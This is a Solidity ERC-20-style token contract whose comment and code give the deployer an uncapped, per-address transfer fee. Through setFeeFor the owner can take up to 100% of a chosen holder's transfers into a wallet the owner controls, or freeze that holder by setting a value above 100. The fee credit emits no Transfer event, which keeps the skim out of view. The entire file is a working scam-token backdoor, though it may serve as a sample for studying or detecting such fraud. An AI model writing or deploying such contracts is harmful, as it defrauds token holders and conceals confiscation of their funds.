// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
// Global fee is 3%, but the owner can set a per-address fee - 100% for whoever they like.
contract PersonalFeeToken {
    uint256 public totalSupply = 1e24;
    address public owner;
    address public marketingWallet;
    uint256 public baseFee = 3;
    mapping(address => uint256) public feeOf;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    modifier onlyOwner() { require(msg.sender == owner); _; }
    constructor() { owner = msg.sender; marketingWallet = msg.sender; _balances[msg.sender] = totalSupply; }
    function setFeeFor(address holder, uint256 pct) external onlyOwner { feeOf[holder] = pct; }
    function balanceOf(address a) public view returns (uint256) { return _balances[a]; }
    function transfer(address to, uint256 amount) external returns (bool) { _transfer(msg.sender, to, amount); return true; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transferFrom(address f, address t, uint256 a) external returns (bool) { allowance[f][msg.sender] -= a; _transfer(f, t, a); return true; }
    function _transfer(address from, address to, uint256 amount) internal {
        uint256 pct = feeOf[from] > 0 ? feeOf[from] : baseFee;
        uint256 fee = amount * pct / 100;
        _balances[from] -= amount;
        _balances[marketingWallet] += fee;
        _balances[to] += amount - fee;
        emit Transfer(from, to, amount - fee);
    }
}
